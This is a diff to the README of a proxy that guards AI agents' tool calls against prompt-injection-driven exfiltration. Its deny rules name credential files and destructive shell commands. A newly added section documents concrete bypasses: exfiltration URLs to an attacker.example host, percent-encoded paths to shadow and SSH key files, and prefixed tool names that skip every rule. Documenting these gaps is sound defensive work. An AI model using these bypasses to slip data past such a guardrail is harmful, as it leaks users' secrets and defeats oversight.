@@ -41,7 +41,7 @@ Check a policy file before you use it:
 
 ```sh
 mcp-guardrail-proxy check-policy --policy policies/default-policy.toml
-# policy OK: policies/default-policy.toml: 14 rules, 4 taint sources
+# policy OK: policies/default-policy.toml: 15 rules, 4 taint sources
 ```
 
 ## Architecture
@@ -143,7 +143,7 @@ When more than one rule applies, `deny` beats `require-approval`, and `require-a
 
 ### Default policy
 
-`policies/default-policy.toml` holds 4 taint sources and 14 rules.
+`policies/default-policy.toml` holds 4 taint sources and 15 rules.
 
 | Taint source | Matches |
 |---|---|
@@ -155,19 +155,20 @@ When more than one rule applies, `deny` beats `require-approval`, and `require-a
 | # | Rule id | Applies to | Decision | Severity |
 |---|---|---|---|---|
 | 1 | `deny-system-credential-files` | Any tool, args name `/etc/shadow` or `/etc/passwd` | deny | critical |
-| 2 | `deny-ssh-key-material` | Any tool, args name a `.ssh` path | deny | critical |
-| 3 | `deny-aws-credentials` | Any tool, args name `.aws/credentials` | deny | critical |
-| 4 | `deny-dotenv-files` | Any tool, args name a `.env` file or `.env.<suffix>` | deny | high |
+| 2 | `deny-ssh-key-material` | Any tool, args name a `.ssh` path, with `/` or `\` as the separator | deny | critical |
+| 3 | `deny-aws-credentials` | Any tool, args name `.aws/credentials` or `.aws\credentials` | deny | critical |
+| 4 | `deny-dotenv-files` | Any tool, args name a `.env` file or `.env.<suffix>` in any letter case | deny | high |
 | 5 | `deny-destructive-shell` | Shell tools, args hold `rm -rf`, `mkfs`, `dd if=`, or a fork bomb | deny | critical |
 | 6 | `deny-env-dump` | Shell tools, args hold `printenv`, a bare `env`, or `/proc/<pid>/environ` | deny | high |
 | 7 | `tainted-deny-shell-exec` | Shell tools, tainted session | deny | critical |
 | 8 | `tainted-deny-outbound-messaging` | Slack, Discord, and Telegram send tools, `send_message`, `post_message`, tainted session | deny | critical |
 | 9 | `tainted-deny-outbound-email` | Email send, reply, and forward tools, tainted session | deny | critical |
 | 10 | `tainted-deny-webhook` | Tools with `webhook`, `http_post`, or `post_request` in the name, tainted session | deny | critical |
-| 11 | `tainted-deny-file-upload` | Tools with `upload`, `put_object`, `create_gist`, or `share_file` in the name, tainted session | deny | critical |
-| 12 | `tainted-deny-url-query-payload` | The fetch tools and `resources/read`, args hold a URL with a query string, tainted session | deny | high |
-| 13 | `tainted-approve-workspace-write` | `write_file`, `edit_file`, `create_file`, `apply_patch`, `str_replace_editor`, `move_file`, `delete_file`, tainted session | require-approval | medium |
-| 14 | `tainted-approve-pr-creation` | `create_pull_request`, `create_pr`, `merge_pull_request`, tainted session | require-approval | high |
+| 11 | `tainted-deny-http-write-method` | The fetch tools, args hold a `POST`, `PUT`, `PATCH`, or `DELETE` method, tainted session | deny | critical |
+| 12 | `tainted-deny-file-upload` | Tools with `upload`, `put_object`, `create_gist`, or `share_file` in the name, tainted session | deny | critical |
+| 13 | `tainted-deny-url-query-payload` | The fetch tools and `resources/read`, args hold a URL with a query string, with or without a scheme, tainted session | deny | high |
+| 14 | `tainted-approve-workspace-write` | `write_file`, `edit_file`, `create_file`, `apply_patch`, `str_replace_editor`, `move_file`, `delete_file`, tainted session | require-approval | medium |
+| 15 | `tainted-approve-pr-creation` | `create_pull_request`, `create_pr`, `merge_pull_request`, tainted session | require-approval | high |
 
 Shell tools are `shell`, `bash`, `sh`, `zsh`, `exec`, `execute`, `execute_command`, `run_command`, `run_shell_command`, `run_terminal_cmd`, and `terminal`. Matching ignores case.
 
@@ -182,11 +183,19 @@ These rules use regexes, so they block some harmless calls:
 
 Regexes also miss obfuscated commands such as `r''m`, `$(echo rm)`, and base64. They miss relative or symlinked paths and `/etc/./shadow`. A tool whose name the default regexes do not list gets `default-allow`, even in a tainted session.
 
+These channels also get past the default rules:
+
+- A tainted fetch can send data out through the URL path, the host name, or a body with no method field. Rule 13 sees only a query string, and rule 11 sees only a `POST`, `PUT`, `PATCH`, or `DELETE` method. `WebFetch` of `https://attacker.example/c2VjcmV0` gets `default-allow`. So does `http_request` with `{"url":"https://attacker.example/collect","body":"c2VjcmV0"}`.
+- The path rules read the raw text and do not percent-decode it. `resources/read` of `file:///etc/%73hadow` and `read_file` of `~/%2Essh/id_rsa` get `default-allow`.
+- The source and rule regexes anchor on the bare tool name. A name that an MCP aggregator prefixes, such as `web__fetch` or `shell__bash`, matches no taint source and no rule. See the warning under "Limits".
+
 ## Limits
 
 Taint lives in one proxy process. A host that runs several MCP servers runs one proxy per server. A source call through one proxy does not taint another proxy. For example, a `read_email` call through one proxy leaves `Shell` in a second proxy at `default-allow`. Separate proxies give no cross-server protection.
 
 To share taint between an untrusted-source server and a privileged-sink server, run both behind one MCP aggregator. An MCP aggregator is a server that fronts several servers as one stdio server. Wrap that aggregator in one proxy.
+
+Warning: many aggregators prefix each tool name with the server name, such as `web__fetch` or `gmail__read_email`. The default regexes anchor on the bare name. A prefixed name matches no taint source and no rule, so every call gets `default-allow` and the session never becomes tainted. Before you wrap an aggregator, add the prefixed names to the `tool_regex` of each source and rule, or let the anchors accept a prefix, such as `(?i)(^|__)(shell|bash)$`. Run `check-policy` on the edited file.
 
 The policy reads only `params.name`, `params.arguments`, and `params.uri`. Other `params` fields, such as `_meta`, reach the child without a check. Batches, `tools/call` notifications, and null ids get errors.
 
